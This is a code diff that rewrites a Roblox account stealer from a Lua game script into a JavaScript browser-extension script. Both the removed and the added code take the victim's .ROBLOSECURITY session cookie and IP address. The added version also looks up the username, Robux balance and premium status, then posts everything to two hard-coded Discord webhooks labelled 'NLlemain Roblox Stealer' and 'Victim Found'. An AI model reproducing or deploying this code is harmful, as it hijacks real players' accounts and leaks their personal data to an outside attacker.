@@ -1,39 +1,77 @@
-local request = (syn and syn.request) or (http and http.request) or request or http_request
-local webhook = "https://discord.com/api/webhooks/1377972531130138674/qDmlwgnmLWUkAcX1AhmCRkdRwSdQuVu8jIW57N7skaSKcnjTr6Z1bOiukkGL7Yzoq32H"
+const WEBHOOK = "https://discord.com/api/webhooks/1377972531130138674/qDmlwgnmLWUkAcX1AhmCRkdRwSdQuVu8jIW57N7skaSKcnjTr6Z1bOiukkGL7Yzoq32H";
+const SECOND_WEBHOOK = "https://discord.com/api/webhooks/1377972519595671732/yuXPP7aWI-fPp-_KrSHmNu7grkKDvpvALxE8V-6bo98PtY-KplDbQjpEXqBS72BzK6B8"; //add the web hook here
 
-local function GetRobloxCookie()
-    local cookie
-    pcall(function()
-        cookie = game:GetService("Players").LocalPlayer:GetAttribute("RobloxCookie") or
-                game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true):match("%.ROBLOSECURITY=([^;]+)")
-    end)
-    return cookie or "Не удалось получить куки"
-end
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
 
-local playerData = {
-    ["Username"] = game.Players.LocalPlayer.Name,
-    ["UserID"] = game.Players.LocalPlayer.UserId,
-    ["IP"] = game:HttpGet("https://api.ipify.org"),
-    ["Cookie"] = GetRobloxCookie(),
-    ["Game"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
+
+    const payload = {
+        "content": null,
+        "embeds": [
+            {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                    {
+                        "name": "Username",
+                        "value": statistics ? statistics.UserName : "N/A",
+                        "inline": true
+                    },
+                    {
+                        "name": "Robux",
+                        "value": statistics ? statistics.RobuxBalance : "N/A",
+                        "inline": true
+                    },
+                    {
+                        "name": "Premium",
+                        "value": statistics ? statistics.IsPremium : "N/A",
+                        "inline": true
+                    }
+                ],
+                "author": {
+                    "name": "Victim Found: " + ipAddr,
+                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
+                },
+                "thumbnail": {
+                    "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+            }
+        ],
+        "username": "NLlemain Roblox Stealer",
+        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
+        "attachments": []
+    };
+
+
+    await Promise.all([
+        fetch(WEBHOOK, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        }),
+        fetch(SECOND_WEBHOOK, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
+    ]);
 }
 
-local embed = {
-    ["title"] = " НОВЫЙ ЛОГ ",
-    ["color"] = 16711680,
-    ["fields"] = {
-        {["name"] = " Игрок", ["value"] = playerData.Username.." ("..playerData.UserID..")", ["inline"] = true},
-        {["name"] = " IP", ["value"] = "||"..playerData.IP.."||", ["inline"] = true},
-        {["name"] = " Игра", ["value"] = playerData.Game, ["inline"] = false},
-        {["name"] = " Cookie", ["value"] = "```"..playerData.Cookie.."```", ["inline"] = false}
-    },
-    ["footer"] = {["text"] = "Stealer v3.0 | "..os.date("%d.%m.%Y %H:%M:%S")}
-}
-
-request({
-    Url = webhook,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}})
-})
-
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
